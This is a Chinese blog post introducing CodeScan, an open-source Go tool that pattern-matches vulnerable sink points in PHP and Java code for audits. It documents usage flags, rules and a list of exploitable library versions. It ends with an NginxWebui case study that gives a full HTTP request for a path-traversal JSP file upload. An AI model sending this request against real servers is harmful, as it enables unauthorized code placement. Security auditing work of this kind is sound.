#  开源：快速代码审计辅助工具，助力0day挖掘   
jack  剁椒鱼头没剁椒   2024-09-29 19:27  
  
# 1. 开发 - CodeScan  
# 2. 前言  
  
这里是详细解释下CodeScan的用法，之前偏向于快速的代码审计，于是就写了一个这种快速匹配Sink点的工具，省的每次点点点搜搜索了，Python属实不优雅，就拿go写了一下，难度不大，练练手的项目，审计也不能一成不变的死磕，利用一些辅助工具会事半功倍，以下为完全详解，有任何问题和Bug可以Github上提Issue或者在Blog的关于页面找我的联系方式进行私聊，对师傅们有帮助的话可以点点Stars捏。  
  
项目地址：  
```
https://github.com/Zjackky/CodeScan
```  
  
# 3. CodeScan  
## 3.1. 工具概述  
  
该工具目的为对大多数不完整的代码以及依赖快速进行Sink点匹配来帮助红队完成快速代码审计，开发该工具的初衷是以Sink到Source的思路来开发，为了将所有可疑的Sink点匹配出来并且凭借第六感进行快速漏洞挖掘，并且该工具开发可扩展性强，成本极低，目前工具支持的语言有PHP，Java(JSP)  
## 3.2. 编译  
```
./build.sh

# 会生成所有版本在releases下
```  
## 3.3. 功能  
1. 框架识别  
  
1. 涵盖大部分漏洞的Sink点的匹配(如图)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdiakzvtEryGepcPXJnYlBnnkNEos9pFdmibm7HZPyKTEgxzNE1aMDEOicQ/640?wx_fmt=png&from=appmsg "")  
  
  
1. 可自定义定制化修改黑白名单内容  
  
1. 多模块化多语言化代码审计  
  
1. 进行融于鉴权代码的快速匹配抓取  
  
1. 根据Jar进行静态分析(默认分析)  
  
- mysqlconnect-->jdbc  
  
- Xstream --> xml/json  
  
## 3.4. 使用  
```
Usage of ./CodeScan_darwin_arm64:
  -L string
        审计语言
  -d string
        要扫描的目录
  -h string
        使用帮助
  -lb string
        行黑名单
  -m string
        过滤的字符串
  -pb string
        路径黑名单
  -r string
        RCE规则
  -u string
        文件上传规则


Example:
 CodeScan_windows_amd64.exe -L java -d ./net
 CodeScan_windows_amd64.exe -L php -d ./net
 CodeScan_windows_amd64.exe -d ./net -m "CheckSession.jsp"
```  
## 3.5. 高级用法  
  
以下均以Java作为示例  
### 3.5.1. 高扩展性  
  
很简单的自定义，如果需要自定义一些匹配规则，首先可以在这里加入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdXTLJ50YrSVYM31NK52FCBHicGrxRPQguV0hiatpsekpWV2QzxiaQgMEuA/640?wx_fmt=png&from=appmsg "")  
  
  
其次如果需要新增漏洞类型，只需要三步(这里以Sql为例)  
1. 新建SQL目录  
  
1. 定义一个方法叫 SqlCheck  
  
1. 写一个sqlcheck.txt(生成的文件名) + 你自定义的规则  
  
1. 最后在这里加入包名+方法名即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdUOGWc3e1tgbp5ddA5asgexPY6SGJBia6F1fvOMqdyBxx2eqIOYDxicicg/640?wx_fmt=png&from=appmsg "")  
  
```
package SqlTest

import (
 "CodeScan/FindFile"
 "fmt"
)

func SqlCheck(dir string) {
 FindFile.FindFileByJava(dir, "fastjson.txt", []string{".parseObject("})
 fmt.Println("SqlCheck分析完成")

}


```  
### 3.5.2. 扫描位置  
  
在打一些闭源代码的时候经常就一个Jar或者Class，反编译的时候会把依赖进行一起反编译，所以为了避免扫描一些依赖的误报，在工具中自带的黑名单中会过滤掉如下黑名单的包名，需要自定义的时候可自行修改，位置在CommonVul/Rule/MatchPathRule.go  
```
var PathBlackJava = []string{
 "apache", "lombok", "microsoft", "solr",
 "amazonaws", "c3p0", "jodd", "afterturn", "hutool",
 "javassist", "alibaba", "aliyuncs", "javax", "jackson",
 "bytebuddy", "baomidou", "google", "netty", "redis", "mysql",
 "logback", "ognl", "oracle", "sun", "junit", "reactor", "github",
 "mchange", "taobao", "nimbusds", "opensymphony", "freemarker", "java", "apiguardian", "hibernate", "javassist", "jboss", "junit", "mybatis",
 "springframework", "slf4j",
}

```  
  
所以这也导致了一个问题，不能从顶层上直接扫描  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJd2reECkK6zzc0FBxGvIdl2BMt2AFhO3EDeOF4OSlkjVsn0IqHT5HvPw/640?wx_fmt=png&from=appmsg "")  
  
image  
  
请把CodeScan放在Net同级目录下扫描(否则会忽略掉直接一个Java目录)  
  
请-d后面的参数尽量在/src/main/java之后，比如这里就需要把CodeScan放到net目录下开始扫描  
```
CodeScan_windows_amd64.exe -L java -d ./net

```  
### 3.5.3. 过滤字符串(只写了JSP + PHP)  
  
比如现在有一个代码百分百为鉴权代码在JSP中  
```
<%@ include file="../../common/js/CheckSession.jsp"%>

```  
  
此时可以用一下功能来进行快速获取未鉴权代码  
```
CodeScan_windows_amd64.exe -d ./yuan -m "CheckSession.jsp"

```  
  
此时会将不存在这个代码的文件都放到NoAuthDir目录中，然后可以再扫一遍就可以立刻定位到存在未鉴权并且存在Sink点的函数文件了  
```
CodeScan_windows_amd64.exe -L java -d ./NoAuthDir
```  
### 3.5.4. 静态分析依赖情况  
  
只需要在CodeScan的目录下放入EvilJarList.txt即可匹配出来  
  
EvilJarList.txt 内容为存在可打漏洞的Jar,模版如下  
```
fastjson-1.2.47.jar
resin-4.0.63.jar
jackson-core-2.13.3.jar
c3p0-0.9.5.2.jar
commons-beanutils-1.9.4.jar
commons-beanutils-1.9.3.jar
commons-beanutils-1.9.2.jar
commons-collections-3.2.1.jar
mysql-connector-java-8.0.17.jar
commons-collections4-4.0.jar
shiro-core-1.10.1.jar
aspectjweaver-1.9.5.jar
rome-1.0.jar
xstream-1.4.11.1.jar
sqlite-jdbc-3.8.9.jar
vaadin-server-7.7.14.jarhessian-4.0.63.jar
```  
## 3.6. TODO  
- 将结果从TXT转为Excel  
  
- Sink点继续完善  
  
- ASP  
  
## 3.7. 支持项目  
- 如果有师傅发现Bug或者有更好的建议请提issue感谢  
  
- 要是各位师傅通过本人的小工具挖到一些好洞记得回头点点Stars诶  
  
## 3.8. 详细使用文章(内附案例)  
### 3.8.1. 案例  
  
这里就展示下一些简单的代码，只有自己用了才知道真香  
#### 3.8.1.1. NginxWebui  
  
先框架分析为Spring  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdX6O62kyGWamf4spQRgO8AI2k7LJsItQOn0fu5YYEwtgqiax6Y01H3zQ/640?wx_fmt=png&from=appmsg "")  
  
##### unsetunset3.8.1.1.1. 任意文件上传unsetunset  
  
工具扫描出结果为  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJd6Eicic7ibZG1zOQdIDHRQ9PuuL0nx5U6XHbjniaKem0fBVRkZ1ZR1pdwXQ/640?wx_fmt=png&from=appmsg "")  
  
有时候代码就是可以直接秒的，这里发现transferTo 这个sink点就在控制层  
  
找到src/main/java/com/cym/controller/adminPage/MainController.java  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJd0KBmmkKterVvZXvEu1HuL4t6ia7LIsUru1jrD0qIcJdAhE9zIzPoUgA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdtDEyzmBM5FlYyK5QAs697Edu6lMdnwXJDFXiaZNMia6qwmlQoNFAwkGA/640?wx_fmt=png&from=appmsg "")  
  
这种名字可以进行跨目录上传  
  
直接传即可上传成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJd6EBYwPOxsKIib7ZN12icUmWjn8XG3EickeQMzticWBbp8UjG3K6T6G4QsA/640?wx_fmt=png&from=appmsg "")  
  
报文  
```
POST /admiNPage/main/upload HTTP/1.1
Host: localhost:8080
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 0
Origin: http://localhost:8080
Referer: http://localhost:8080/adminPage/monitor
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
 
------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="../3.jsp"
Content-Type: image/jpeg
 
<%out.print("test");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJddlCQvKFK7cFrglfn5okb79upGsm96xicJAOGMia1FlRH0kXS29F81g3w/640?wx_fmt=png&from=appmsg "")  
  
‍  
##### unsetunset3.8.1.1.2. RCEunsetunset  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdx8RYdFbzHsRGzfdqX7oz0woFs1IOd74mFp5TtL2CFrqqIqR6UHzwkA/640?wx_fmt=png&from=appmsg "")  
  
直接去找了下控制层的代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdDgFNuZ0f8W7icicG8anXqzAQZIxibSyX1V63u1uXyl02mnib9pJqrKvysg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdicRpZuY14PZL5DaZLY4c7M279MlwC0AXOtiaWfadnBX2OichpwkxbibP2Q/640?wx_fmt=png&from=appmsg "")  
  
emmm这代码可真弱智，再去调用控制层的代码。。。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yLWibFaIDAFqKRM0y6YsL5aubv6LIdYJdcckNPX0qeSicsQGe1n7ztbv69MEf1gI1FYFXiaPKD8bticYKNuAs0ehMA/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
由于一些闭源代码不适合放，因此就拿个开源的nday来进行分析吧，其实原理懂了之后只是合适辅助罢了，但我看开源上都没有人写过，也是就造下轮子开源出来了  
  
‍  
  
  
